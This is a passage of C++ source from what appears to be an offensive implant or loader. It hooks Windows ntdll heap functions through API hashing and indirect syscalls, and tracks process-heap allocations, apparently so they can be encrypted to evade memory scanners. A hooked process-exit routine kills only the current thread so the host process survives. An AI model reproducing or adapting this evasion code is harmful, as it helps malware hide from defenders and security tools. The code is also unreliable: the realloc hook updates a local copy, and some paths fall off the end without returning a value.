            ModuleDetails ntdllDetails3 = Instance::GetModuleDetails(NTDLLDLL_HASH);
            InstallHook(ntdllDetails3.BaseAddress, ntdllDetails3.ImageExportDirectory, RTLREALLOCATEHEAP_HASH, (void*)&HookedRtlReAllocateHeap, restore, &RestoreBuffers.RtlReAllocateHeap, &RestoreJumpBuffers.RtlReAllocateHeap);
            break;
        case RTLFREEHEAP_HOOK:
            ModuleDetails ntdllDetails4 = Instance::GetModuleDetails(NTDLLDLL_HASH);
			InstallHook(ntdllDetails4.BaseAddress, ntdllDetails4.ImageExportDirectory, RTLFREEHEAP_HASH, (void*)&HookedRtlFreeHeap, restore, &RestoreBuffers.RtlFreeHeap, &RestoreJumpBuffers.RtlFreeHeap);
			break;
    }
}

int64_t PatcherAndHooker::HookedRtlExitUserProcess(int64_t status) {
    // If we try to do anything other than exit this thread, we will crash the process
    SyscallPrepare(SystemCalls::SysTable.SysNtTerminateThread.wSyscallNr, SystemCalls::SysTable.SysNtTerminateThread.pRecycled);
    Instance::NtStatus = SysNtTerminateThread(Instance::Thread, 0);
    return STATUS_SUCCESS;
}

PVOID PatcherAndHooker::HookedRtlAllocateHeap(HANDLE HeapHandle, ULONG Flags, SIZE_T Size) {
    if (HeapHandle == SystemCalls::Peb->ProcessHeap) {
        pRtlEnterCriticalSection _pRtlEnterCriticalSection = (pRtlEnterCriticalSection)Win32::NtdllTable.pRtlEnterCriticalSection.pAddress;
        pRtlLeaveCriticalSection _pRtlLeaveCriticalSection = (pRtlLeaveCriticalSection)Win32::NtdllTable.pRtlLeaveCriticalSection.pAddress;

        HeapAllocation allocation = { 0 };

        allocation.HeapHandle = HeapHandle;
        allocation.Flags = Flags;
        allocation.Size = Size;
        allocation.BaseAddress = ((pRtlAllocateHeap)(RestoreJumpBuffers.RtlAllocateHeap.buffer))(HeapHandle, Flags, Size);
        allocation.ReturnAddress = _ReturnAddress();

        _pRtlEnterCriticalSection(&CriticalSection);

        StackHeapCrypt::HeapAllocations[StackHeapCrypt::HeapAllocationsIndex] = allocation;
        StackHeapCrypt::HeapAllocationsIndex++;

        _pRtlLeaveCriticalSection(&CriticalSection);

        return allocation.BaseAddress;
    }
    else {
		return ((pRtlAllocateHeap)(RestoreJumpBuffers.RtlAllocateHeap.buffer))(HeapHandle, Flags, Size);
	}
}

PVOID PatcherAndHooker::HookedRtlReAllocateHeap(HANDLE HeapHandle, ULONG Flags, PVOID BaseAddress, SIZE_T Size) {
    if (HeapHandle == SystemCalls::Peb->ProcessHeap) {
        pRtlEnterCriticalSection _pRtlEnterCriticalSection = (pRtlEnterCriticalSection)Win32::NtdllTable.pRtlEnterCriticalSection.pAddress;
        pRtlLeaveCriticalSection _pRtlLeaveCriticalSection = (pRtlLeaveCriticalSection)Win32::NtdllTable.pRtlLeaveCriticalSection.pAddress;

        for (int i = 0; i < StackHeapCrypt::HeapAllocationsIndex; i++) {
            HeapAllocation allocation = StackHeapCrypt::HeapAllocations[i];

            if (allocation.BaseAddress == BaseAddress) {                
                _pRtlEnterCriticalSection(&CriticalSection);

				PVOID newBaseAddress = ((pRtlReAllocateHeap)(RestoreJumpBuffers.RtlReAllocateHeap.buffer))(HeapHandle, Flags, BaseAddress, Size);

                if (newBaseAddress == BaseAddress) {
					allocation.Size = Size;
                    allocation.Flags = Flags;
                    allocation.ReturnAddress = _ReturnAddress();
				}
                else {
					allocation.BaseAddress = newBaseAddress;
					allocation.Size = Size;
                    allocation.Flags = Flags;					
                    allocation.ReturnAddress = _ReturnAddress();
				}

                _pRtlLeaveCriticalSection(&CriticalSection);

                return newBaseAddress;
			}
		}        
	}
    else {
		return ((pRtlReAllocateHeap)(RestoreJumpBuffers.RtlReAllocateHeap.buffer))(HeapHandle, Flags, BaseAddress, Size);
	}
}

BOOLEAN PatcherAndHooker::HookedRtlFreeHeap(HANDLE HeapHandle, ULONG Flags, PVOID BaseAddress) {
    if (HeapHandle == SystemCalls::Peb->ProcessHeap) {
        pRtlEnterCriticalSection _pRtlEnterCriticalSection = (pRtlEnterCriticalSection)Win32::NtdllTable.pRtlEnterCriticalSection.pAddress;
        pRtlLeaveCriticalSection _pRtlLeaveCriticalSection = (pRtlLeaveCriticalSection)Win32::NtdllTable.pRtlLeaveCriticalSection.pAddress;

        for (int i = 0; i < StackHeapCrypt::HeapAllocationsIndex; i++) {
            HeapAllocation allocation = StackHeapCrypt::HeapAllocations[i];

            if (allocation.BaseAddress == BaseAddress) {
                _pRtlEnterCriticalSection(&CriticalSection);

                BOOLEAN result = ((pRtlFreeHeap)(RestoreJumpBuffers.RtlFreeHeap.buffer))(HeapHandle, Flags, BaseAddress);                

                if (result) {                    
                    Instance::removeElementFromArray(StackHeapCrypt::HeapAllocations, StackHeapCrypt::HeapAllocationsIndex + 1, i);
                    StackHeapCrypt::HeapAllocationsIndex--;                    
                }

                _pRtlLeaveCriticalSection(&CriticalSection);

                return result;
			}
		}        
    }
    else {
        return ((pRtlFreeHeap)(RestoreJumpBuffers.RtlFreeHeap.buffer))(HeapHandle, Flags, BaseAddress);
    }
}
